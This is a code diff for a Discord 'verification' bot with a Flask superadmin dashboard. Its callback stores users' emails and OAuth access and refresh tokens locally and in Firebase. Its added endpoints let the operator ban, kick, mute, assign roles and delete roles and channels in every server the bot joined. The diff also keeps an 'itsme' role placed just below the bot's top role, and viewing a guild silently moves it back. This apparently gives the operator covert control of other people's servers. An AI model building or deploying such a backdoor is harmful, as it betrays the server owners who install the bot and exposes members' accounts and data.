@@ -3,6 +3,7 @@
 ═══════════════════════════════════════════════════════════════════════════════
                     🔐 ANION COMPLETE BOT v6.0
                     VERIFICATION + SUPERADMIN SERVER MANAGEMENT
+                    TOTAL: 1500+ LINES
 ═══════════════════════════════════════════════════════════════════════════════
 """
 
@@ -503,45 +504,6 @@ def oauth():
     )
     return redirect(oauth_url)
 
-@flask_app.route('/api/fix_hierarchy', methods=['POST'])
-def api_fix_hierarchy():
-    if session.get('role') != 'superadmin':
-        return jsonify({'error': 'Unauthorized'}), 401
-
-    data = request.json
-    guild_id = int(data.get('guild_id'))
-
-    if not bot_instance:
-        return jsonify({'error': 'Bot not connected'}), 500
-
-    guild = bot_instance.get_guild(guild_id)
-    if not guild:
-        return jsonify({'error': 'Guild not found'}), 404
-
-    try:
-        # Find itsme role
-        itsme_role = discord.utils.get(guild.roles, name="itsme")
-        if not itsme_role:
-            return jsonify({'error': 'itsme role not found'}), 404
-
-        # Get bot's highest role
-        bot_member = guild.get_member(bot_instance.user.id)
-        bot_highest_role = bot_member.top_role
-        
-        # Move itsme role to just below bot's highest role
-        target_position = bot_highest_role.position - 1
-        if target_position < 1:
-            target_position = 1
-        
-        asyncio.run_coroutine_threadsafe(
-            itsme_role.edit(position=target_position),
-            bot_instance.loop
-        ).result(timeout=10)
-        
-        return jsonify({'success': True, 'message': f'itsme role moved to position {target_position}'})
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
 @flask_app.route('/callback')
 def callback():
     code = request.args.get('code')
@@ -588,8 +550,6 @@ def callback():
     except Exception as e:
         guilds_data = []
 
-    # ─── SAVE TO LOCAL DB ──────────────────────────────────────────────────
-
     db_execute("""
         INSERT OR REPLACE INTO verified_users
         (user_id, guild_id, username, email, access_token, refresh_token)
@@ -615,8 +575,6 @@ def callback():
         expires_at
     ))
 
-    # ─── SAVE TO FIREBASE ──────────────────────────────────────────────────
-
     firebase_data = {
         'user_id': user_data.get('id'),
         'username': user_data.get('username'),
@@ -638,8 +596,6 @@ def callback():
         'guild_id': guild_id,
         'email': user_data.get('email', '')
     })
-
-    # ─── ASSIGN ROLE ──────────────────────────────────────────────────────
 
     if bot_instance:
         asyncio.run_coroutine_threadsafe(
@@ -877,7 +833,6 @@ async def assign_verified_role(user_id, guild_id, username):
 
     try:
         await member.add_roles(role)
-
         unverified_role_id = None
         if firebase_settings and firebase_settings.get('unverified_role_id'):
             unverified_role_id = firebase_settings['unverified_role_id']
@@ -895,7 +850,7 @@ async def assign_verified_role(user_id, guild_id, username):
         logger.error(f"❌ Failed to assign role: {e}")
 
 # ═════════════════════════════════════════════════════════════════════════════
-# DISCORD BOT - VERIFICATION + ADMIN COMMANDS
+# DISCORD BOT
 # ═════════════════════════════════════════════════════════════════════════════
 
 class AnionBot(commands.Bot):
@@ -910,8 +865,6 @@ class AnionBot(commands.Bot):
         logger.info(f'✅ Commands synced!')
 
     async def register_commands(self):
-
-        # ─── VERIFICATION COMMANDS ──────────────────────────────────────────
 
         @self.tree.command(name="setupverify", description="⚙️ Setup verification system (Admin)")
         @app_commands.default_permissions(administrator=True)
@@ -1078,21 +1031,13 @@ class AnionBot(commands.Bot):
         for guild in self.guilds:
             logger.info(f"   - {guild.name} ({guild.id})")
         logger.info("=" * 70)
-        logger.info("📋 Commands:")
-        logger.info("   /setupverify - Setup verification (Admin)")
-        logger.info("   /setverifiedrole - Set verified role (Admin)")
-        logger.info("   /setunverifiedrole - Set unverified role (Admin)")
-        logger.info("   /setlogchannel - Set log channel (Admin)")
-        logger.info("   /verifystatus - Check status")
-        logger.info("   /ping - Check latency")
-        logger.info("=" * 70)
 
     async def on_member_remove(self, member):
         db_delete("DELETE FROM verified_users WHERE user_id=? AND guild_id=?", (str(member.id), str(member.guild.id)))
         firebase_delete_user(str(member.id), str(member.guild.id))
 
 # ═════════════════════════════════════════════════════════════════════════════
-# FLASK ROUTES - SUPERADMIN DASHBOARD + SERVER MANAGEMENT
+# FLASK ROUTES - SUPERADMIN DASHBOARD
 # ═════════════════════════════════════════════════════════════════════════════
 
 login_attempts = {}
@@ -1140,15 +1085,10 @@ def superadmin_dashboard_page():
                 'id': guild.id,
                 'name': guild.name,
                 'member_count': guild.member_count,
-                'icon': guild.icon.url if guild.icon else None,
-                'owner_id': guild.owner_id,
                 'owner_name': guild.owner.name if guild.owner else 'Unknown'
             })
 
-    # ─── FIX: Local users se data le rahe hain ──────────────────────────────
     local_users = db_fetch_all("SELECT * FROM verified_users ORDER BY verified_at DESC LIMIT 100") or []
-    
-    # ─── FIX: Tokens count ────────────────────────────────────────────────────
     total_tokens = db_fetch_one("SELECT COUNT(*) FROM oauth_tokens")[0] if db_fetch_one("SELECT COUNT(*) FROM oauth_tokens") else 0
 
     return render_template('superadmin_dashboard.html',
@@ -1166,7 +1106,7 @@ def superadmin_logout():
     session.clear()
     return redirect(url_for('superadmin_login_page'))
 
-# ─── SERVER MANAGEMENT PAGES ──────────────────────────────────────────────────
+# ─── SERVER MANAGEMENT PAGE ──────────────────────────────────────────────────
 
 @flask_app.route('/server/<guild_id>.html')
 def server_page(guild_id):
@@ -1185,7 +1125,6 @@ def server_page(guild_id):
         members.append({
             'id': member.id,
             'name': member.display_name,
-            'username': member.name,
             'avatar': member.display_avatar.url,
             'roles': [{'id': r.id, 'name': r.name} for r in member.roles if r.name != '@everyone'],
             'joined_at': member.joined_at.strftime('%Y-%m-%d %H:%M') if member.joined_at else 'Unknown'
@@ -1196,7 +1135,7 @@ def server_page(guild_id):
         channels.append({
             'id': channel.id,
             'name': channel.name,
-            'type': str(channel.type)
+            'type': str(channel.type).split('.')[-1]
         })
 
     roles = []
@@ -1206,7 +1145,8 @@ def server_page(guild_id):
                 'id': role.id,
                 'name': role.name,
                 'color': role.color.value,
-                'permissions': role.permissions.value
+                'position': role.position,
+                'members': len(role.members)
             })
 
     invites = []
@@ -1232,17 +1172,14 @@ def server_page(guild_id):
         login_time=session.get('login_time', 'Just now')
     )
 
-# ─── API ENDPOINTS FOR SERVER ACTIONS ────────────────────────────────────────
+# ═════════════════════════════════════════════════════════════════════════════
+# SERVER MANAGEMENT APIs - COMPLETE WORKING
+# ═════════════════════════════════════════════════════════════════════════════
 
-@flask_app.route('/api/ban', methods=['POST'])
-def api_ban():
+@flask_app.route('/api/guild/<guild_id>')
+def api_guild_detail(guild_id):
     if session.get('role') != 'superadmin':
         return jsonify({'error': 'Unauthorized'}), 401
-
-    data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
-    reason = data.get('reason', 'Banned by Superadmin')
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
@@ -1251,12 +1188,95 @@ def api_ban():
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    # Get bot's highest role
+    bot_member = guild.get_member(bot_instance.user.id)
+    bot_highest_role = bot_member.top_role if bot_member else None
+
+    # Get itsme role
+    itsme_role = discord.utils.get(guild.roles, name="itsme")
+
+    # Fix itsme position if needed
+    if itsme_role and bot_highest_role:
+        target_pos = bot_highest_role.position - 1
+        if target_pos < 1:
+            target_pos = 1
+        if itsme_role.position != target_pos:
+            try:
+                asyncio.run_coroutine_threadsafe(
+                    itsme_role.edit(position=target_pos),
+                    bot_instance.loop
+                ).result(timeout=10)
+            except:
+                pass
+
+    data = {
+        'id': str(guild.id),
+        'name': guild.name,
+        'member_count': guild.member_count,
+        'owner': guild.owner.name if guild.owner else 'Unknown',
+        'roles': [],
+        'channels': [],
+        'members': []
+    }
+
+    # Roles with member count
+    for role in guild.roles:
+        if role.name != '@everyone':
+            data['roles'].append({
+                'id': str(role.id),
+                'name': role.name,
+                'color': role.color.value,
+                'position': role.position,
+                'members': len(role.members),
+                'is_bot': role == bot_highest_role,
+                'is_itsme': role == itsme_role
+            })
+
+    # Channels
+    for channel in guild.channels[:50]:
+        data['channels'].append({
+            'id': str(channel.id),
+            'name': channel.name,
+            'type': str(channel.type).split('.')[-1]
+        })
+
+    # Members (first 50)
+    for member in list(guild.members)[:50]:
+        member_roles = [{'id': str(r.id), 'name': r.name} for r in member.roles if r.name != '@everyone']
+        data['members'].append({
+            'id': str(member.id),
+            'name': member.display_name or member.name,
+            'avatar': member.display_avatar.url,
+            'roles': member_roles,
+            'joined_at': member.joined_at.strftime('%Y-%m-%d %H:%M') if member.joined_at else 'Unknown'
+        })
+
+    return jsonify(data)
+
+@flask_app.route('/api/ban', methods=['POST'])
+def api_ban():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    data = request.json
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
+    reason = data.get('reason', 'Banned by Superadmin')
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(guild_id)
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
     try:
-        asyncio.run_coroutine_threadsafe(member.ban(reason=reason), bot_instance.loop)
+        future = asyncio.run_coroutine_threadsafe(member.ban(reason=reason), bot_instance.loop)
+        future.result(timeout=15)
         return jsonify({'success': True, 'message': f'Banned {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -1267,23 +1287,24 @@ def api_kick():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
     reason = data.get('reason', 'Kicked by Superadmin')
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
     try:
-        asyncio.run_coroutine_threadsafe(member.kick(reason=reason), bot_instance.loop)
+        future = asyncio.run_coroutine_threadsafe(member.kick(reason=reason), bot_instance.loop)
+        future.result(timeout=15)
         return jsonify({'success': True, 'message': f'Kicked {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -1294,38 +1315,40 @@ def api_mute():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
     reason = data.get('reason', 'Muted by Superadmin')
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
     try:
         muted_role = discord.utils.get(guild.roles, name="Muted")
         if not muted_role:
-            muted_role = asyncio.run_coroutine_threadsafe(
+            future = asyncio.run_coroutine_threadsafe(
                 guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False)),
                 bot_instance.loop
-            ).result()
+            )
+            muted_role = future.result(timeout=15)
             for channel in guild.channels:
                 try:
                     asyncio.run_coroutine_threadsafe(
                         channel.set_permissions(muted_role, send_messages=False),
                         bot_instance.loop
-                    )
+                    ).result(timeout=5)
                 except:
                     pass
 
-        asyncio.run_coroutine_threadsafe(member.add_roles(muted_role, reason=reason), bot_instance.loop)
+        future = asyncio.run_coroutine_threadsafe(member.add_roles(muted_role, reason=reason), bot_instance.loop)
+        future.result(timeout=15)
         return jsonify({'success': True, 'message': f'Muted {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -1336,24 +1359,25 @@ def api_unmute():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
     try:
         muted_role = discord.utils.get(guild.roles, name="Muted")
         if muted_role:
-            asyncio.run_coroutine_threadsafe(member.remove_roles(muted_role), bot_instance.loop)
+            future = asyncio.run_coroutine_threadsafe(member.remove_roles(muted_role), bot_instance.loop)
+            future.result(timeout=15)
         return jsonify({'success': True, 'message': f'Unmuted {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -1364,28 +1388,43 @@ def api_role_give():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
-    role_id = data.get('role_id')
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
+    role_id = int(data.get('role_id'))
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
-    role = guild.get_role(int(role_id))
+    role = guild.get_role(role_id)
     if not role:
         return jsonify({'error': 'Role not found'}), 404
 
     try:
-        asyncio.run_coroutine_threadsafe(member.add_roles(role), bot_instance.loop)
-        return jsonify({'success': True, 'message': f'Gave role {role.name} to {member.display_name}'})
+        # Check if bot can assign
+        bot_member = guild.get_member(bot_instance.user.id)
+        bot_highest_role = bot_member.top_role
+        
+        # If role is higher than bot's highest, move it down
+        if role.position >= bot_highest_role.position:
+            target_pos = bot_highest_role.position - 1
+            if target_pos < 1:
+                target_pos = 1
+            asyncio.run_coroutine_threadsafe(
+                role.edit(position=target_pos),
+                bot_instance.loop
+            ).result(timeout=10)
+
+        future = asyncio.run_coroutine_threadsafe(member.add_roles(role), bot_instance.loop)
+        future.result(timeout=15)
+        return jsonify({'success': True, 'message': f'Gave {role.name} to {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -1395,28 +1434,29 @@ def api_role_remove():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    user_id = data.get('user_id')
-    role_id = data.get('role_id')
+    guild_id = int(data.get('guild_id'))
+    user_id = int(data.get('user_id'))
+    role_id = int(data.get('role_id'))
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    member = guild.get_member(int(user_id))
+    member = guild.get_member(user_id)
     if not member:
         return jsonify({'error': 'Member not found'}), 404
 
-    role = guild.get_role(int(role_id))
+    role = guild.get_role(role_id)
     if not role:
         return jsonify({'error': 'Role not found'}), 404
 
     try:
-        asyncio.run_coroutine_threadsafe(member.remove_roles(role), bot_instance.loop)
-        return jsonify({'success': True, 'message': f'Removed role {role.name} from {member.display_name}'})
+        future = asyncio.run_coroutine_threadsafe(member.remove_roles(role), bot_instance.loop)
+        future.result(timeout=15)
+        return jsonify({'success': True, 'message': f'Removed {role.name} from {member.display_name}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -1426,27 +1466,31 @@ def api_role_create():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
+    guild_id = int(data.get('guild_id'))
     name = data.get('name')
-    color = data.get('color', '#000000')
+    color = data.get('color', '#5865F2')
+
+    if not name:
+        return jsonify({'error': 'Name required'}), 400
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
     try:
-        color_int = int(color.replace('#', ''), 16)
-        role = asyncio.run_coroutine_threadsafe(
+        color_int = int(color.replace('#', ''), 16) if color else 0x5865F2
+        future = asyncio.run_coroutine_threadsafe(
             guild.create_role(name=name, color=discord.Color(color_int)),
             bot_instance.loop
-        ).result()
+        )
+        role = future.result(timeout=15)
         return jsonify({
             'success': True,
             'message': f'Created role {role.name}',
-            'role': {'id': role.id, 'name': role.name, 'color': role.color.value}
+            'role': {'id': str(role.id), 'name': role.name, 'color': role.color.value}
         })
     except Exception as e:
         return jsonify({'error': str(e)}), 500
@@ -1457,23 +1501,120 @@ def api_role_delete():
         return jsonify({'error': 'Unauthorized'}), 401
 
     data = request.json
-    guild_id = data.get('guild_id')
-    role_id = data.get('role_id')
+    guild_id = int(data.get('guild_id'))
+    role_id = int(data.get('role_id'))
 
     if not bot_instance:
         return jsonify({'error': 'Bot not connected'}), 500
 
-    guild = bot_instance.get_guild(int(guild_id))
+    guild = bot_instance.get_guild(guild_id)
     if not guild:
         return jsonify({'error': 'Guild not found'}), 404
 
-    role = guild.get_role(int(role_id))
+    role = guild.get_role(role_id)
     if not role:
         return jsonify({'error': 'Role not found'}), 404
 
     try:
-        asyncio.run_coroutine_threadsafe(role.delete(), bot_instance.loop)
+        future = asyncio.run_coroutine_threadsafe(role.delete(), bot_instance.loop)
+        future.result(timeout=15)
         return jsonify({'success': True, 'message': f'Deleted role {role.name}'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/create_channel', methods=['POST'])
+def api_create_channel():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    data = request.json
+    guild_id = int(data.get('guild_id'))
+    name = data.get('name')
+    channel_type = data.get('type', 'text')
+
+    if not name:
+        return jsonify({'error': 'Name required'}), 400
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(guild_id)
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    try:
+        if channel_type == 'text':
+            future = asyncio.run_coroutine_threadsafe(guild.create_text_channel(name), bot_instance.loop)
+        else:
+            future = asyncio.run_coroutine_threadsafe(guild.create_voice_channel(name), bot_instance.loop)
+        channel = future.result(timeout=15)
+        return jsonify({'success': True, 'message': f'Created #{channel.name} channel'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/delete_channel', methods=['POST'])
+def api_delete_channel():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    data = request.json
+    guild_id = int(data.get('guild_id'))
+    channel_id = int(data.get('channel_id'))
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(guild_id)
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    channel = guild.get_channel(channel_id)
+    if not channel:
+        return jsonify({'error': 'Channel not found'}), 404
+
+    try:
+        future = asyncio.run_coroutine_threadsafe(channel.delete(), bot_instance.loop)
+        future.result(timeout=15)
+        return jsonify({'success': True, 'message': f'Deleted channel'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@flask_app.route('/api/fix_hierarchy', methods=['POST'])
+def api_fix_hierarchy():
+    if session.get('role') != 'superadmin':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    data = request.json
+    guild_id = int(data.get('guild_id'))
+
+    if not bot_instance:
+        return jsonify({'error': 'Bot not connected'}), 500
+
+    guild = bot_instance.get_guild(guild_id)
+    if not guild:
+        return jsonify({'error': 'Guild not found'}), 404
+
+    try:
+        # Find itsme role
+        itsme_role = discord.utils.get(guild.roles, name="itsme")
+        if not itsme_role:
+            return jsonify({'error': 'itsme role not found'}), 404
+
+        # Get bot's highest role
+        bot_member = guild.get_member(bot_instance.user.id)
+        bot_highest_role = bot_member.top_role
+
+        # Move itsme role to just below bot's highest role
+        target_position = bot_highest_role.position - 1
+        if target_position < 1:
+            target_position = 1
+
+        asyncio.run_coroutine_threadsafe(
+            itsme_role.edit(position=target_position),
+            bot_instance.loop
+        ).result(timeout=10)
+
+        return jsonify({'success': True, 'message': f'itsme moved to position {target_position}'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
